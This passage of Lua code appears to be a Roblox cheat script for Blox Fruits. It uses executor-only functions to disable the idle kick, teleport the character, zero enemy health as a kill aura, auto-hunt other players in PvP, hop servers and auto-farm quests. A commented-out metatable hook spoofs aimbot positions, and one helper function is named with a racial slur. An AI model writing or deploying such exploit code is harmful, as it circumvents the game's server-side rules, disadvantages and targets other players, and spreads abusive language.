    local RealColorName = BricksWithColors[BrickColorName]
    if not getgenv().ServerData['PlayerData']['Colors'][RealColorName] then
        return false 
    else
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("activateColor", RealColorName) 
        return true
    end
end   
local TOIKHONGBIET = 0
RunService.Heartbeat:Connect(function()
    if game.PlaceId == 2753915549 then
        Sea1 = true
        Sea2 = false
        Sea3 = false 
        MySea = "Sea 1"
    elseif game.PlaceId == 4442272183 then
        Sea2 = true
        Sea1 = false
        Sea3 = false
        MySea = "Sea 2"
    elseif game.PlaceId == 7449423635 then
        Sea3 = true
        Sea1 = false
        Sea2 = false
        MySea = "Sea 3"
    end
    if IsPlayerAlive() then  
        if game.Players.LocalPlayer.Character:FindFirstChild("RaceEnergy") and game.Players.LocalPlayer.Character.RaceEnergy.Value >= 1 and not game.Players.LocalPlayer.Character.RaceTransformed.Value then 
            SendKey('Y',.5)
        end
        EnableBuso()
        if tick()-getgenv().Ticktp < 0.5 or KillingMob or (getgenv().tween and getgenv().tween.PlaybackState and tostring(string.gsub(tostring(getgenv().tween.PlaybackState), "Enum.PlaybackState.", "")) == 'Playing') or (getgenv().TweenStats and tostring(string.gsub(tostring(getgenv().TweenStats), "Enum.PlaybackState.", "")) == 'Playing') then 
            AddBodyVelocity(true)
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
                if v:IsA("BasePart") or v:IsA("Part") then 
                    v.CanCollide = false 
                end
            end
        else
            AddBodyVelocity(false)
        end 
        if KillingMob or tick()-TOIKHONGBIET < 1 then return end   
        TOIKHONGBIET = tick() 
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")
        if Sea3 and not getgenv().ServerData["Inventory Items"]['Cursed Dual Katana'] and getgenv().ServerData["Inventory Items"]['Tushita'] and getgenv().ServerData["Inventory Items"]['Yama'] and getgenv().ServerData["Inventory Items"]['Tushita'].Mastery >= 350 and getgenv().ServerData["Inventory Items"]['Yama'].Mastery then 
            getgenv().CDKQuest = CheckQuestCDK()  
            getgenv().WeaponType = 'Sword' 
        end 
        if getgenv().ServerData["Inventory Items"]['Cursed Dual Katana'] and getgenv().CDKQuest then 
            getgenv().CDKQuest = nil 
        end
        if getgenv().ServerData["PlayerData"].Beli >= 3500000 then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Geppo")
            -- Buy Buso Haki
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Buso")
            -- Buy Soru
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyHaki","Soru") 
        end
        for i,v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do 
            if v then 
                getgenv().ServerData["Inventory Items"][v.Name] = v  
            end
        end
        if not getgenv().ServerData['PlayerData']["Elite Hunted"] or getgenv().ServerData['PlayerData']["Elite Hunted"] < 30 then 
            getgenv().ServerData['PlayerData']["Elite Hunted"] = tonumber(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter", "Progress")) or 0 
        end
        getgenv().ServerData['PlayerData']["RaceVer"] = CheckRaceVer()  
        for i, v in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
            if v["Unlocked"] then
                getgenv().ServerData['PlayerData']['Colors'][v.HiddenName] = v
            end
        end
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin", "Buy") 
        local v141, v142 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ColorsDealer", "1")
        if v141 and v142 and v142 > 5000 then 
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ColorsDealer", "2")
        end
    end
end) 
local GC = getconnections or get_signal_cons
if GC then
    game.Players.LocalPlayer.Idled:Connect(
        function()
            for i, v in pairs(GC(game.Players.LocalPlayer.Idled)) do
                v:Disable()
            end
        end
    )
end 
--[[
local getrawgame = getrawmetatable(game)
local oldraw = getrawgame.__namecall
setreadonly(getrawgame,false)
getrawgame.__namecall = newcclosure(function(...)
	local method = getnamecallmethod()
	local args = {...}
	if tostring(method) == "FireServer" then
		if tostring(args[1]) == "RemoteEvent" then
			if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
				if getgenv().AimbotToggle and getgenv().AimbotPosition then
					args[2] = getgenv().AimbotPosition
					return oldraw(unpack(args))
				end
			end
		end
	end
	return oldraw(...)
end)
]]

warn('Loaded Success Full!')
getgenv().EnLoaded = true   
LoadPlayer()

    ----
    local namequest
local BlackListedKillPlayers = {} 
function AutoL()
    
    if getgenv().QuestKillPlayer and not game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
        getgenv().QuestKillPlayer = false 
    end 
    local BOSSCP =  getgenv().ServerData['Server Bosses']['Dark Beard'] or getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King'] 
    if Sea3 and not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") and not BOSSCP and getgenv().ServerData['Server Bosses']['rip_indra True Form'] then 
        BOSSCP = getgenv().ServerData['Server Bosses']['rip_indra True Form'] 
    end
    if game.PlaceId == 2753915549 and not getgenv().QuestKillPlayer and game.Players.LocalPlayer.Data.Level.Value >= 35 and game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("PlayerHunter") ~="I don't have anything for you right now. Come back later." then 
        namequest =
            string.gsub(
            game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
            "Defeat ",
            ""
        )
        namequest = string.gsub(namequest, " %p(0/1)%p", "") 
        if
            game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible and
                namequest and
                game:GetService("Workspace").Characters:FindFirstChild(namequest)
            then
                getgenv().QuestKillPlayer = true
        end
    elseif game.PlaceId == 2753915549 and game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible and getgenv().QuestKillPlayer then 
        namequest =
            string.gsub(
            game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
            "Defeat ",
            ""
        )
        namequest = string.gsub(namequest, " %p(0/1)%p", "") 
        if #BlackListedKillPlayers >= 6 then 
            repeat 
                warn('Start Hop Server')
                HopServer(10,true,"Find Player") 
                CancelKillPlayer() 
                task.wait(5) 
            until 5 > 6
        end
        if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
        else
            if
            game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible and
                not game:GetService("Workspace").Characters:FindFirstChild(namequest)
            then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                warn('Cancel: not found')
            end
            if
                game.Players[namequest].Data.Level.Value < 20 or
                    game.Players[namequest].Data.Level.Value > game.Players.LocalPlayer.Data.Level.Value +122
            then
                table.insert(BlackListedKillPlayers, namequest)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                getgenv().QuestKillPlayer = false 
                warn('Cancel: not enough requirements |',namequest)
            end 
            if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
                if KillPlayer(namequest) then 
                    getgenv().QuestKillPlayer = false 
                else
                    table.insert(BlackListedKillPlayers, namequest)
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                    getgenv().QuestKillPlayer = false
                end
            end
        end
        
    elseif not getgenv().QuestKillPlayer and game.PlaceId == 2753915549 and game.Players.LocalPlayer.Data.Level.Value < 120 and game.Players.LocalPlayer.Data.Level.Value >= 10 then 
        KillMobList({"Shanda [Lv. 475]","Royal Squad [Lv. 525]"})
    elseif Sea2 and getgenv().ServerData["PlayerBackpack"]['Hidden Key'] and not getgenv().ServerData["Inventory Items"]["Rengoku"] then 
        EquipWeaponName('Hidden Key')
        Tweento(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875)) 
    elseif Sea2 and (getgenv().ServerData["PlayerBackpack"]['Library Key'] and not getgenv().Config.IceCastleDoorPassed) or getgenv().ServerData["PlayerBackpack"]['Water Key'] then 
        if getgenv().ServerData["PlayerBackpack"]['Library Key'] then 
            EquipWeaponName('Library Key')
            Tweento(CFrame.new(
                6375.9126,
                296.634583,
                -6843.14062,
                -0.849467814,
                1.5493983e-08,
                -0.527640462,
                3.70608895e-08,
                1,
                -3.0301031e-08,
                0.527640462,
                -4.5294577e-08,
                -0.849467814
            ))
        else 
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true) 
        end
    elseif Sea2 and getgenv().ServerData['PlayerData'].Level >= 1350 and not game.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("OpenLibrary") and getgenv().ServerData['PlayerData'].Level < 1425 and getgenv().ServerData['Server Bosses']['Awakened Ice Admiral'] then
        KillBoss(getgenv().ServerData['Server Bosses']['Awakened Ice Admiral']) 
    elseif Sea2 and getgenv().ServerData['PlayerData'].Level >= 1425 and not game.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("OpenLibrary") and getgenv().ServerData['Server Bosses']['Tide Keeper'] then 
        KillBoss(getgenv().ServerData['Server Bosses']['Tide Keeper'])
    elseif BOSSCP then 
        KillBoss(BOSSCP)
    elseif not getgenv().QuestKillPlayer and (getgenv().ServerData['PlayerData'].Level < 2550 or game.PlaceId ~= 7449423635 ) then
        FarmMobByLevel()
    else 
        if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
            FarmMobByLevel((function()
                local a = {2200,2250}
                return a[math.random(1,2)]
            end)())
        else 
            KillMobList({
                "Cookie Crafter",
                "Cake Guard",
                "Head Baker",
                "Baking Staff"
            })
        end
    end
end

AutoBone = function()
    if not Sea3 then
        TeleportWorld(3)
    end 
if getgenv().ServerData['PlayerData'].Level >= 2000 and Config.AcceptQuest then
    if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
        FarmMobByLevel(2000)
    else 
        KillMobList({
            "Reborn Skeleton [Lv. 1975]",
            "Living Zombie [Lv. 2000]",
            "Demonic Soul [Lv. 2025]",
            "Posessed Mummy [Lv. 2050]"
        })
    end
else 
    KillMobList({
        "Reborn Skeleton [Lv. 1975]",
        "Living Zombie [Lv. 2000]",
        "Demonic Soul [Lv. 2025]",
        "Posessed Mummy [Lv. 2050]"
    })
end
end


AutoCake = function()
    local v204 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
        
        local CPB = getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King'] 
            if not Sea3 then
                TeleportWorld(3)
            end
            local CPB = getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King'] 
                if getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King'] then
                    KillBoss(CPB)
                end
                if v204:find("open the portal now") and Config.OpenDoorCake then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                        
                    else
                        levelcustom = 2200
                        if getgenv().ServerData['PlayerData'].Level >= 2275 then
                                        levelcustom = 2275
                    end
                    if getgenv().ServerData['PlayerData'].Level >= 2000 and Config.AcceptQuest then
                        if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
                            FarmMobByLevel(levelcustom)
                        else
                        KillMobList({
                            "Cookie Crafter [Lv. 2200]",
                            "Cake Guard [Lv. 2225]",
                            "Baking Staff [Lv. 2250]",
                            "Head Baker [Lv. 2275]"
                        })
                        end
                    else
                        KillMobList({
                            "Cookie Crafter [Lv. 2200]",
                            "Cake Guard [Lv. 2225]",
                            "Baking Staff [Lv. 2250]",
                            "Head Baker [Lv. 2275]"
                        })
                                end
                            end
end

AutoNear = function()
    for i,v in pairs(game.workspace.Enemies:GetChildren()) do 
        if v:FindFirstChildOfClass("Humanoid") and v.Humanoid.Health > 0 and GetDistance(v.HumanoidRootPart.CFrame) <= 1e4 then 
            KillNigga(v)
            end
        end
end

    coroutine.wrap(function()
        while wait() do
            if Config.Start then
                if Config.SelecFarm == 'Level' then
                    AutoL()
    elseif Config.SelecFarm == 'Bone' then
        AutoBone()
    elseif Config.SelecFarm == 'Cake' then
        AutoCake()
    elseif Config.SelecFarm == "Nearest" then
        AutoNear()
                        end
                    end
                end   
    end)()




    function RedeemAllCodesX2()
        CodesX2 = {
            "Sub2CaptainMaui",
            "CODE_SERVICIO",
            "CINCODEMAYO_BOOST",
            "15B_BESTBROTHERS",
            "DEVSCOOKING",
            "GAMERROBOT_YT",
            "ADMINGIVEAWAY",
            "GAMER_ROBOT_1M",
            "TY_FOR_WATCHING",
            "kittgaming",
            "Sub2Fer999",
            "Enyu_is_Pro",
            "Magicbus",
            "JCWK",
            "Starcodeheo",
            "Bluxxy",
            "fudd10_v2",
            "FUDD10",
            "BIGNEWS",
            "THEGREATACE",
            "SUB2GAMERROBOT_EXP1",
            "Sub2OfficialNoobie",
            "StrawHatMaine",
            "SUB2NOOBMASTER123",
            "Sub2Daigrock",
            "Axiore",
            "TantaiGaming"
        }
        for r, v in pairs(CodesX2) do
            game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(v)
        end
    end

    ---
    ----item
    repeat task.wait() until getgenv().EnLoaded 
    getgenv().CurrentTask = ""  
    getgenv().TaskUpdateTick = tick()  
    getgenv().PirateRaidTick = 0
    function refreshTask() 
    if tick()-getgenv().TaskUpdateTick >= 60 then 
        getgenv().CurrentTask = ''
    end
    if getgenv().CurrentTask == '' then  
        if getgenv().ServerData["PlayerBackpack"]['Special Microchip'] or CheckIsRaiding() then 
            getgenv().CurrentTask = 'Auto Raid'
        elseif getgenv().ServerData['PlayerData'].DevilFruit == '' and getgenv().SnipeFruit and getgenv().FruitSniping and checkFruittoEat(getgenv().FruitSniping,getgenv().IncludeStored) then 
            getgenv().CurrentTask = 'Eat Fruit'
        elseif #getgenv().ServerData['Workspace Fruits'] > 0 then 
            getgenv().CurrentTask = 'Collect Fruit' 
        elseif Sea3 and getgenv().CurrentElite then 
            getgenv().CurrentTask = 'Hunting Elite'  
        elseif Sea3 and getgenv().ServerData['PlayerData'].Level >= 2000 and not getgenv().ServerData["Inventory Items"]["Tushita"] and (getgenv().ServerData['Server Bosses']['rip_indra True Form'] or (not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate"))) then 
            getgenv().CurrentTask = 'Getting Tushita'
        elseif Sea3 and not getgenv().ServerData["Inventory Items"]["Yama"] and (getgenv().ServerData['PlayerData']["Elite Hunted"] >= 30 or getgenv().ServerData['PlayerData'].Level >= 2100) then 
            getgenv().CurrentTask = 'Getting Yama' 
        elseif Sea3 and getgenv().CDKQuest and getgenv().CDKQuest ~= '' then 
            getgenv().CurrentTask = 'Getting Cursed Dual Katana' 
        elseif (Sea2 or Sea3) and getgenv().ServerData['PlayerData'].Level >= 2550 and getgenv().ServerData['PlayerData'].Beli >= 2000000 and (getgenv().ServerData['PlayerData'].RaceVer ~= 'V3' and getgenv().ServerData['PlayerData'].RaceVer ~="V4") then 
            getgenv().CurrentTask = 'Auto V3'
        elseif getgenv().ServerData['PlayerData'].Level > 200  and not getgenv().ServerData["Inventory Items"]["Saber"] then 
            getgenv().CurrentTask = 'Saber Quest'
        elseif getgenv().ServerData['PlayerData'].Level >= 2300 and not getgenv().ServerData["Inventory Items"]["Soul Guitar"] then 
            getgenv().CurrentTask = 'Getting Soul Guitar'
        elseif Sea3 and (getgenv().HallowEssence or getgenv().SoulReaper or getgenv().ServerData['Server Bosses']['Soul Reaper'] or getgenv().ServerData["PlayerBackpack"]['Hallow Essence']) then 
            getgenv().CurrentTask = 'Getting Hallow Scythe'
        elseif getgenv().ServerData['PlayerData'].Level > 150 
        and not getgenv().ServerData["Inventory Items"]["Pole (1st Form)"] 
        and (getgenv().ServerData['Server Bosses']['Thunder God']) then 
            getgenv().CurrentTask = 'Pole Quest'
        elseif Sea1 and getgenv().ServerData['PlayerData'].Level >= 700 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0 then 
            getgenv().CurrentTask = 'Sea 2 Quest'
        elseif Sea3 and (getgenv().CakePrince or (getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King'] ))  then 
            getgenv().CurrentTask = 'Cake Prince Raid Boss Event'
        elseif (Sea2 or Sea3) and (getgenv().ServerData['Server Bosses']['Core'] or (Sea3 and getgenv().PirateRaidTick and tick()-getgenv().PirateRaidTick < 60)) then 
            getgenv().CurrentTask = '3rd Sea Event'
        elseif Sea2 and getgenv().ServerData['PlayerData'].Level >= 850 and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 3 then
            getgenv().CurrentTask = 'Bartilo Quest'
        elseif Sea2 and getgenv().ServerData['PlayerData'].Level >= 1500 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Zou") ~= 0 then 
            getgenv().CurrentTask = 'Auto Sea 3' 
        elseif (Sea2 or Sea3) and (getgenv().RipIndra or getgenv().DarkBeard or getgenv().ServerData['Server Bosses']['Dark Beard'] or getgenv().ServerData['Server Bosses']['rip_indra True Form']) then 
            getgenv().CurrentTask = 'Auto Raid Boss' 
        elseif Sea3 and (getgenv().ServerData['PlayerBackpack']["God's Chalice"] and (not UnCompleteColor() or HasColor(UnCompleteColor().Part.BrickColor.Name))) then 
            getgenv().CurrentTask = "Using God's Chalice"
        elseif Sea2 and getgenv().ServerData['PlayerData'].Beli >= 500000 and getgenv().ServerData["Inventory Items"]["Warrior Helmet"] and getgenv().ServerData['PlayerData'].RaceVer == 'V1' then 
            getgenv().CurrentTask = 'Race V2 Quest' 
        end  
        getgenv().TaskUpdateTick = tick()
    end
    end 

    local rF1,rF2 
    task.delay(.1,function()
    while task.wait(.5) do 
        task.wait()
        rF1,rF2  = pcall(function()
            refreshTask() 
        end)
        if not rF1 then 
            warn('Refreshing task error:',rF2)
        end
    end
    end)   
    ---------
    AutoRaid = function()
        if getgenv().ServerData['Nearest Raid Island'] then 
            local RaidDis = GetDistance(getgenv().ServerData['Nearest Raid Island'])
            if RaidDis < 5000 then
                Tweento(getgenv().ServerData['Nearest Raid Island'].CFrame  *CFrame.new(0,60,0)) 
            end
        elseif getgenv().ServerData["PlayerBackpack"]['Special Microchip'] then
            SetContent('Firing raid remote...',3)
            getgenv().NextRaidIslandId = 1
            if Sea2 then
                fireclickdetector(Workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector) 
            elseif Sea3 then
                fireclickdetector(Workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
            end
            wait(12)
        end
        SetContent('Doing raid')   
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 3100)
        for i,v in pairs(workspace.Enemies:GetChildren()) do 
            if v:FindFirstChildOfClass('Humanoid') then 
                v:FindFirstChildOfClass('Humanoid').Health = 0 
            end 
        end     
        if not getgenv().KillAuraConnection then 
            getgenv().KillAuraConnection = workspace.Enemies.ChildAdded:Connect(function(v)     
                local V5Hum = v:FindFirstChildOfClass('Humanoid') or v:WaitForChild('Humanoid')
                if V5Hum then 
                    V5Hum.Health = 0 
                end
            end) 
        end
    end

AutoCore = function()
    if Sea2 and getgenv().ServerData['Server Bosses']['Core'] then
        KillBoss(getgenv().ServerData['Server Bosses']['Core']) 
    end
end


    spawn(function ()
        while wait() do
        if Config.Core then
            AutoCore()
            end
        end
    end
    )


    AutoPirateWave = function()
        local CastleCFrame = CFrame.new(-5543.5327148438, 313.80062866211, -2964.2585449219)
        if (Sea3 and getgenv().PirateRaidTick and tick()-getgenv().PirateRaidTick < 60) then
        if GetDistance(CastleCFrame) > 1500 then 
            Tweento(CastleCFrame * CFrame.new(0,-100,0))
        else
            for i,v in pairs(game.workspace.Enemies:GetChildren()) do 
                if v:FindFirstChildOfClass("Humanoid") and v.Humanoid.Health > 0 and GetDistance(v.PrimaryPart,CastleCFrame) <= 1500 then 
                    KillNigga(v)
                end
            end
        end
    end
end

    
    coroutine.wrap(function()
        while wait() do
            if Config.RaidCastle then
                AutoPirateWave()
            end
        end
    end)()



    AutoMeleeFunc = function()
        if getgenv().MeleeTask == 'Find Ice' then  
            if getgenv().ServerData["PlayerBackpack"]['Library Key'] then 
                EquipWeaponName('Library Key')
                Tweento(CFrame.new(
                    6375.9126,
                    296.634583,
                    -6843.14062,
                    -0.849467814,
                    1.5493983e-08,
                    -0.527640462,
                    3.70608895e-08,
                    1,
                    -3.0301031e-08,
                    0.527640462,
                    -4.5294577e-08,
                    -0.849467814
                ))
            elseif getgenv().ServerData['Server Bosses']['Awakened Ice Admiral'] then 
                KillBoss(getgenv().ServerData['Server Bosses']['Awakened Ice Admiral'])
            else 
                HopServer(10,true,'Find Awakened Ice Admiral')
            end
        elseif getgenv().MeleeTask == 'Find Waterkey' then  
            if getgenv().ServerData["PlayerBackpack"]['Water Key'] then 
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true) 
            elseif getgenv().ServerData['Server Bosses']['Tide Keeper'] then 
                KillBoss(getgenv().ServerData['Server Bosses']['Tide Keeper'])
            else 
                HopServer(10,true,'Find Tide Keeper')
            end
        end
    end 
    AutoMeleeCheck = function()
        task.spawn(function()
            getgenv().MeleeTask = 'None'
            repeat task.wait() until getgenv().Config and getgenv().Config["Melee Level Values"]
            while task.wait(1) do 
                local MLLV = getgenv().Config["Melee Level Values"]
                if MLLV["Superhuman"] == 0 then
                    if MLLV["Black Leg"] < 300 then 
                        BuyMelee('Black Leg')
                    elseif MLLV["Fishman Karate"] < 300 then 
                        BuyMelee('Fishman Karate') 
                    elseif MLLV["Electro"] < 300 then 
                        BuyMelee('Electro')   
                    elseif MLLV["Dragon Claw"] < 300 then 
                        if getgenv().ServerData['PlayerData'].Fragments < 1500 then 
                            getgenv().FragmentNeeded = true 
                        else 
                            getgenv().FragmentNeeded = false 
                        end
                        BuyMelee('Dragon Claw')
                    end 
                elseif MLLV['Sharkman Karate'] == 0 or MLLV['Death Step'] == 0 then 
                    if MLLV['Fishman Karate'] < 400 then 
                        BuyMelee('Fishman Karate')  
                    elseif MLLV['Death Step'] < 400 then 
                        BuyMelee('Death Step') 
                    end 
                    BuyMelee('Sharkman Karate') 
                    BuyMelee('Death Step')
                    pcall(function() 
                        local v178 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
                        getgenv().Config.WaterkeyPassed = v178 == 3;
                        getgenv().Config.IceCastleDoorPassed = not game.Workspace.Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.CanCollide 
                    end) 
                    if (not getgenv().Config.IceCastleDoorPassed) and (getgenv().ServerData["PlayerBackpack"]['Library Key'] or getgenv().ServerData['Server Bosses']['Awakened Ice Admiral'] or getgenv().ServerData['PlayerData'].Level >= 1450) then 
                        getgenv().MeleeTask = 'Find Ice'
                    elseif not getgenv().Config.WaterkeyPassed and (getgenv().ServerData["PlayerBackpack"]['Water Key'] or getgenv().ServerData['Server Bosses']['Tide Keeper'] or getgenv().ServerData['PlayerData'].Level >= 1450) then 
                        getgenv().MeleeTask = 'Find Waterkey'
                    end 
                else  
                    getgenv().MeleeTask = ''
                end
            end
        end)
    end
    AutoMeleeCheck()

    AutoRaceV2 = function()
        if not Sea2 then 
            repeat 
                TeleportWorld(2)
                task.wait(3)
            until Sea2 
        end
        if getgenv().ServerData["PlayerBackpack"]['Flower 1'] and getgenv().ServerData["PlayerBackpack"]['Flower 2'] and getgenv().ServerData["PlayerBackpack"]['Flower 3'] then 
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3")
            wait(5)
            getgenv().CurrentTask = '' 
            SetContent('Upgraded V2 Race | Returning task...')
            return
        else
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2") 
            if not getgenv().ServerData["PlayerBackpack"]['Flower 1'] then 
                SetContent('Getting Blue Flower (Flower 1)')
                if workspace.Flower1.Transparency ~= 1 then
                    Tweento(workspace.Flower1.CFrame)   
                else  
                    SetContent('Hopping for Blue Flower',5)
                    HopServer(10,true,"Blue Flower")
                end
            elseif not getgenv().ServerData["PlayerBackpack"]['Flower 2'] then 
                SetContent('Getting Red Flower (Flower 2)')
                Tweento(workspace.Flower2.CFrame)
            else 
                SetContent('Getting Yellow Flower (Flower 3)')
                KillMobList({"Swan Pirate"})
            end
        end
    end



    spawn(function()
        while wait() do
        if Config.RaceV2 then
            if PlayerData().Level >= 850 and Sea2 and getgenv().ServerData["Inventory Items"]["Warrior Helmet"] and getgenv().ServerData['PlayerData'].RaceVer == 'V1' then
                    AutoRaceV2()
            end
        end
    end
    end
    )

AllRaceV2 = function()
    if getgenv().ServerData["Inventory Items"]["Warrior Helmet"] and getgenv().ServerData['PlayerData'].RaceVer == 'V2' then
        return
        end
    if PlayerData().Level >= 850 and PlayerData().Beli >= 500000 then
        if not getgenv().ServerData["Inventory Items"]["Warrior Helmet"]  then
            AutoBartilo()
        end
        if getgenv().ServerData["Inventory Items"]["Warrior Helmet"] and getgenv().ServerData['PlayerData'].RaceVer == 'V1' then
            AutoRaceV2()
    end
 end
end


    spawn(function()
        while wait() do
            if Config.AutoAllRaceV2 then
                AllRaceV2()
                    end
                end
            end
    )


AutoBartilo = function()
    if PlayerData().Level >= 800 and Sea2 then
        local QuestBartiloId = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo")
        if QuestBartiloId == 0 then 
            SetContent('First Bartilo task...')
            warn("Do first task 1")
            if game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text:find("Swan Pirate") and game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text:find("50") and game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible then 
                KillMobList({"Swan Pirate"})
            else
                Tweento(CFrame.new(-456.28952, 73.0200958, 299.895966))
                if GetDistance(CFrame.new(-456.28952, 73.0200958, 299.895966)) < 10 then 
                    local args = {
                        [1] = "StartQuest",
                        [2] = "BartiloQuest",
                        [3] = 1
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
            end 
        elseif QuestBartiloId == 1 then 
            SetContent('Finding Jeremy...')
            if getgenv().ServerData['Server Bosses']['Jeremy'] then 
                KillBoss(getgenv().ServerData['Server Bosses']['Jeremy'])
                getgenv().CurrentTask = ''
            elseif getgenv().ServerData['PlayerData'].Level > 500 then 
            CreateUiNotify({Content = "Boss Jeremy died"})
            end
        elseif QuestBartiloId == 2 then 
            local StartCFrame =
            CFrame.new(
            -1837.46155,
            44.2921753,
            1656.19873,
            0.999881566,
            -1.03885048e-22,
            -0.0153914848,
            1.07805858e-22,
            1,
            2.53909284e-22,
            0.0153914848,
            -2.55538502e-22,
            0.999881566
        )
            if GetDistance(StartCFrame) > 400 then 
                SetContent('Starting templates puzzle...')
                Tweento(StartCFrame)
            else
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1836, 11, 1714)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1850.49329, 13.1789551, 1750.89685)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1858.87305, 19.3777466, 1712.01807)
                task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1803.94324, 16.5789185, 1750.89685)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1858.55835, 16.8604317, 1724.79541)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1869.54224, 15.987854, 1681.00659)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1800.0979, 16.4978027, 1684.52368)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1819.26343, 14.795166, 1717.90625)
                    task.wait(.5)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                    CFrame.new(-1813.51843, 14.8604736, 1724.79541)
                    getgenv().CurrentTask = ''
                    SetContent('Done task | Returning task...')
                                end
                            end
                        end
end


    spawn(function()
        while wait() do
            if Config.Bartilo then
                AutoBartilo()
                        end
                    end
                end
    )
    function PlayerData(Player)
        local datatable = {}
        for i, v in pairs((Player or game.Players.LocalPlayer).Data:GetChildren()) do
            --    warn(v)
            pcall(
                function()
                    if v.Value then
                        datatable[v.Name] = v.Value
                    end
                end
            )
        end
        return datatable
    end



    AutoSea2 = function()  
        if Sea1 and PlayerData().Level >= 700 then
            thg3m:SetValue('Level')
            cacmem:SetValue(false)
        if game.Workspace.Map.Ice.Door.CanCollide then
            if not getgenv().ServerData["PlayerBackpack"]['Key'] then  
                SetContent('Getting key to pass the door...')
                Tweento(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359))
                if GetDistance(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359)) < 5 then
                    game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("DressrosaQuestProgress", "Detective")
